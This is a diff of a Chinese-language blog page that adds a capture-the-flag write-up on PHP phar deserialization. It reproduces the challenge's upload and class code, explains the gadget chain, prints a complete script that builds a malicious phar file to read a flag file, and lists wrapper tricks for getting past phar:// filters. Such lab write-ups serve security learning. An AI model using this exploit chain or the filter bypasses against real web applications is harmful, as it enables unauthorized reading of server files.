+    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; 
+    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; 
+&lt;&#x2F;div&gt; 
+
+&lt;&#x2F;script&gt; 
+&lt;&#x2F;body&gt; 
+&lt;&#x2F;html&gt;</code></pre>
+
+<p>class.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+&#x2F;&#x2F;show_source(__FILE__); 
+include &quot;base.php&quot;; 
+header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); 
+error_reporting(0); 
+function upload_file_do() &#123; 
+    global $_FILES; 
+    $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
+    &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); 
+    if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; 
+        unlink($filename); 
+    &#125; 
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); 
+    echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; 
+&#125; 
+function upload_file() &#123; 
+    global $_FILES; 
+    if(upload_file_check()) &#123; 
+        upload_file_do(); 
+    &#125; 
+&#125; 
+function upload_file_check() &#123; 
+    global $_FILES; 
+    $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
+    $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
+    $extension &#x3D; end($temp); 
+    if(empty($extension)) &#123; 
+        &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; 
+    &#125; 
+    else&#123; 
+        if(in_array($extension,$allowed_types)) &#123; 
+            return true; 
+        &#125; 
+        else &#123; 
+            echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; 
+            return false; 
+        &#125; 
+    &#125; 
+&#125; 
+?&gt; </code></pre>
+
+<p>class.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+    public function __construct($name)
+    &#123;
+        $this-&gt;str &#x3D; $name;
+    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;test &#x3D; $this-&gt;str;
+        echo $this-&gt;test;
+    &#125;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+    public function __construct($file)
+    &#123;
+        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg
+        echo $this-&gt;source;
+    &#125;
+    public function __toString()
+    &#123;
+        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;
+        return $content;
+    &#125;
+    public function __set($key,$value)
+    &#123;
+        $this-&gt;$key &#x3D; $value;
+    &#125;
+    public function _show()
+    &#123;
+        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;
+            die(&#39;hacker!&#39;);
+        &#125; else &#123;
+            highlight_file($this-&gt;source);
+        &#125;
+        
+    &#125;
+    public function __wakeup()
+    &#123;
+        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker~&quot;;
+            $this-&gt;source &#x3D; &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &#123;
+        $this-&gt;params &#x3D; array();
+    &#125;
+    public function __get($key)
+    &#123;
+        return $this-&gt;get($key);
+    &#125;
+    public function get($key)
+    &#123;
+        if(isset($this-&gt;params[$key])) &#123;
+            $value &#x3D; $this-&gt;params[$key];
+        &#125; else &#123;
+            $value &#x3D; &quot;index.php&quot;;
+        &#125;
+        return $this-&gt;file_get($value);
+    &#125;
+    public function file_get($value)
+    &#123;
+        $text &#x3D; base64_encode(file_get_contents($value));
+        return $text;
+    &#125;
+&#125;
+?&gt;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125204709437.png" alt="image-20211125204709437"></p>
+<p>肯定是用这个函数来读取flag文件，但是没有反序列化的地方</p>
+<p>加个新知识</p>
+<p><strong>利用phar协议实现反序列化漏洞攻击</strong></p>
+<p><strong>漏洞成因</strong> </p>
+<p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
+<p>原理分析 </p>
+<p>phar的组成</p>
+<p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p>
+<p>1 .0  a stub</p>
+<p>标识作用，格式为</p>
+<pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre>
+
+<p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p>
+<p>2 .0 </p>
+<p>a manifest describing the contents</p>
+<p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p>
+<p>3 .0 the file contents</p>
+<p>这里指的是被压缩文件的内容；</p>
+<p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p>
+<p>签名，放在结尾；</p>
+<p><strong>C1e4r类中有__destruct(),</strong></p>
+<p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。</p>
+<p>函数中发现了echo，那么要利用echo $this-&gt;test。</p>
+<p><strong>show类有__toString(),</strong></p>
+<p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。</p>
+<p>利用$this-&gt;str[&#39;str&#39;]-&gt;source;</p>
+<p><strong>Test类有__get（）</strong></p>
+<p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p>
+<p>利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p>
+<p>利用C1e4r类的<code>__destruct()</code>中的echo this-&gt;test<br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>this-&gt;test2.触发Show类的</code>__toString()<code>3.利用Show类的</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.触发Test类的</code>__get()<code>5.成功利用</code>file_get()`读文件</p>
+<p>反序列化结果</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+&#125;
+$a &#x3D; new C1e4r();
+$b &#x3D; new Show();
+$c &#x3D; new Test();
+$a -&gt;str &#x3D; $b;
+$b -&gt;str[&#39;str&#39;] &#x3D; $c;
+$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;
+
+
+$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的
+$phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象
+$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+
+<p>生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235333537.png" alt="image-20211125235333537"></p>
+<p>看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235401120.png" alt="image-20211125235401120"></p>
+<p>得到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235433599.png" alt="image-20211125235433599"></p>
+<p>小tips：如果phar协议被过滤，可以试试用</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;    版本：7.4 +
+compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;    版本：都可以
+php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</code></pre>
+
+<h2 id><a href="#" class="headerlink" title></a></h2>
                 
             </div>
             <hr/>
@@ -1600,7 +2162,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.8k</span>
+                        class="white-color">170k</span>
             
             
             
